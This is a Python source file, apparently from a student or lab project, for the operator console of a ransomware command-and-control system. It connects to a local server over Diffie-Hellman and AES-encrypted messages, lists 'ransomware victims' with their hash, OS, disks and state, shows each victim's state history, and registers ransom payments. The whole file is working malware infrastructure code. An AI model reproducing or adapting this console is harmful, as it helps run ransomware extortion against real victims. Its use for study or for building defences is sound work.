from datetime import datetime
import utile.message
import utile.network as network
import utile.security as security
import socket
from utile import config as config

# Constantes
IP_SERV_CONSOLE = socket.gethostbyname(socket.gethostname())
PORT_SERV_CONSOLE = 8380
key = b''


def list_victims(client_socket):
    """
    Request and display the list of ransomware victims.
    """
    global key
    v_list = []

    key = security.diffie_hellman_recv_key(client_socket)
    print("Key received: " + str(key))
    msg = security.aes_encrypt(utile.message.set_message('LIST_VICTIM_REQ'), key)
    print("Encrypted message: " + str(msg))

    # Send the message to the server
    network.send_message(client_socket, msg)

    # Receive and process the server's responses
    confirmation_message_chiffrer = network.receive_message(client_socket)
    confirmation_message = security.aes_decrypt(confirmation_message_chiffrer, key)
    message_type = utile.message.get_message_type(confirmation_message)

    print("Server confirmation: " + str(confirmation_message))
    print("Message type: " + message_type)

    liste_victime_str = "LIST OF RANSOMWARE VICTIMS\n"
    liste_victime_str += "---------------------------\n"
    liste_victime_str += ("id".ljust(5) + "hash".ljust(13) + "os".ljust(13) + "disks".ljust(14) + "states".ljust(11) + "\n")

    while message_type != 'LIST_VICTIM_END':
        if message_type == 'LIST_VICTIM_RESP':
            victim_info = confirmation_message['VICTIM']
            v_list.append(victim_info)

            liste_victime_str += (str(victim_info).rjust(2, '0') + " " +
                    str(confirmation_message['HASH'])[-12:] + " " +
                    str(confirmation_message['OS']).ljust(13) +
                    str(confirmation_message['DISKS'])[:13].ljust(14) +
                    str(confirmation_message['STATE']).ljust(11) + "\n")

            confirmation_message = network.receive_message(client_socket)
            confirmation_message = security.aes_decrypt(confirmation_message, key)
            message_type = utile.message.get_message_type(confirmation_message)

        if message_type == 'LIST_VICTIM_END':
            break

    print(liste_victime_str)
    print("Liste ID victime : " + str(v_list))
    return v_list


def victim_history(client_socket, v_list):
    """
    Request and display the history of a victim based on user input.
    """
    global key
    key = security.diffie_hellman_recv_key(client_socket)
    if not v_list:
        print("Listez les victimes avant !")
        return
    v_id = 0
    while not (1 <= v_id):
        v_id = int(input("Numéro de la victime ? "))
        if not (1 <= v_id):
            print("ID invalide ! ")
    msg = utile.message.set_message('history_req', [v_id])
    msg_chiffrer = security.aes_encrypt(msg, key)
    network.send_message(client_socket, msg_chiffrer)

    msg_chiffrer = network.receive_message(client_socket)
    msg = security.aes_decrypt(msg_chiffrer, key)
    msg_type = utile.message.get_message_type(msg)

    history_text = ''
    while msg_type != 'HISTORY_END':
        if msg_type == 'HISTORY_RESP' and msg['HIST_RESP'] == v_id:
            timestamp = datetime.fromtimestamp(msg['TIMESTAMP'])
            timestamp_str = timestamp.strftime("%d/%m/%Y, %H:%M:%S")
            history_text += (timestamp_str + " - " + msg['STATE'].ljust(14) + "\n")
            msg = network.receive_message(client_socket)
            msg = security.aes_decrypt(msg, key)
            msg_type = utile.message.get_message_type(msg)
        print(history_text)


def ransom_payment(client_socket, v_list):
    key = security.diffie_hellman_recv_key(client_socket)
    if not v_list:
        print("Listez les victimes avant !")
        return
    v_id = 0
    while not (1 <= v_id):
        v_id = int(input("Numéro de la victime ? "))
        if not (1 <= v_id):
            print("ID invalide ! ")
    message = utile.message.set_message('change_state', [v_id])
    message_chiffrer = security.aes_encrypt(message, key)
    network.send_message(client_socket, message_chiffrer)
    print(str(message))


def print_victims_listing(client_socket):
    """
    Display the control console menu and handle user inputs.
    """
    v_list = []
    while True:
        print("CONTROL CONSOLE")
        print("===============")
        print("1) List ransomware victims")
        print("2) Victim's state history")
        print("3) Register ransom payment")
        print("4) Quit")
        user_choice = input("Enter your choice: ")

        if user_choice == "1":
            v_list = list_victims(client_socket)
        elif user_choice == "2":
            victim_history(client_socket, v_list)
        elif user_choice == "3":
            ransom_payment(client_socket, v_list)
        elif user_choice == "4":
            break


def main():
    """
    Main function to connect to the server and display the victim listing console.
    """
    client_socket = network.connect_to_serv(IP_SERV_CONSOLE, PORT_SERV_CONSOLE)
    print("Connected to the server.")

    print_victims_listing(client_socket)

    client_socket.close()
    print("Connection closed.")


if __name__ == '__main__':
    main()
